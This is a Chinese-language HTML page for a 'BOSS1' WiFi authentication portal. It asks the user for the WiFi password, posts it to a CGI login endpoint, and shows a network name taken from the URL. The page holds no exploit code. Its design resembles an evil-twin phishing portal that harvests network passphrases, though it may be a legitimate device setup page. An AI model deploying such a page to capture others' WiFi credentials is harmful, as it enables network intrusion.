<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WiFi 登录 - BOSS1</title>
    <link rel="stylesheet" href="/style.css">
    <style>
        body { display: block; }
    </style>
</head>
<body>
    <button class="theme-toggle" onclick="toggleTheme()">🌙</button>
    
    <div class="container">
        <div class="card">
            <div class="logo">
                <svg class="logo-icon" viewBox="0 0 64 64" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <circle cx="32" cy="32" r="30" stroke="currentColor" stroke-width="2" fill="none"/>
                    <path d="M20 40 L32 20 L44 40" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" fill="none"/>
                    <circle cx="32" cy="44" r="3" fill="currentColor"/>
                </svg>
                <div class="logo-text">BOSS1</div>
            </div>
            
            <h1>WiFi 认证</h1>
            <p>连接到网络需要认证，请输入密码</p>
            
            <div id="error-msg" class="alert alert-error" style="display: none;"></div>
            
            <form id="login-form" action="/cgi-bin/cgi/login" method="POST">
                <div class="form-group">
                    <label for="password">WiFi 密码</label>
                    <input type="password" 
                           id="password" 
                           name="password" 
                           placeholder="请输入 WiFi 密码"
                           required
                           autocomplete="current-password">
                </div>
                
                <div class="form-group">
                    <label>
                        <input type="checkbox" name="remember" style="width: auto; margin-right: 8px;">
                        记住密码
                    </label>
                </div>
                
                <button type="submit" class="btn btn-primary" id="submit-btn">
                    连接网络
                </button>
            </form>
            
            <div class="footer">
                <p>网络: <span id="ssid-display">BOSS1</span></p>
            </div>
        </div>
    </div>
    
    <script>
        // Theme toggle
        function toggleTheme() {
            const body = document.body;
            const btn = document.querySelector('.theme-toggle');
            
            if (body.classList.contains('dark-theme')) {
                body.classList.remove('dark-theme');
                body.classList.add('light-theme');
                btn.textContent = '🌙';
                localStorage.setItem('theme', 'light');
            } else {
                body.classList.remove('light-theme');
                body.classList.add('dark-theme');
                btn.textContent = '☀️';
                localStorage.setItem('theme', 'dark');
            }
        }
        
        // Load saved theme
        const savedTheme = localStorage.getItem('theme');
        if (savedTheme === 'dark') {
            document.body.classList.add('dark-theme');
            document.querySelector('.theme-toggle').textContent = '☀️';
        } else if (savedTheme === 'light') {
            document.body.classList.add('light-theme');
            document.querySelector('.theme-toggle').textContent = '🌙';
        }
        
        // Get SSID from URL parameter
        const urlParams = new URLSearchParams(window.location.search);
        const ssid = urlParams.get('ssid');
        if (ssid) {
            document.getElementById('ssid-display').textContent = decodeURIComponent(ssid);
        }
        
        // Form submission
        document.getElementById('login-form').addEventListener('submit', function(e) {
            const btn = document.getElementById('submit-btn');
            const password = document.getElementById('password').value;
            
            if (password.length < 4) {
                e.preventDefault();
                showError('密码长度至少4位');
                return;
            }
            
            btn.disabled = true;
            btn.textContent = '连接中...';
        });
        
        function showError(msg) {
            const errorDiv = document.getElementById('error-msg');
            errorDiv.textContent = msg;
            errorDiv.style.display = 'block';
        }
    </script>
</body>
</html>
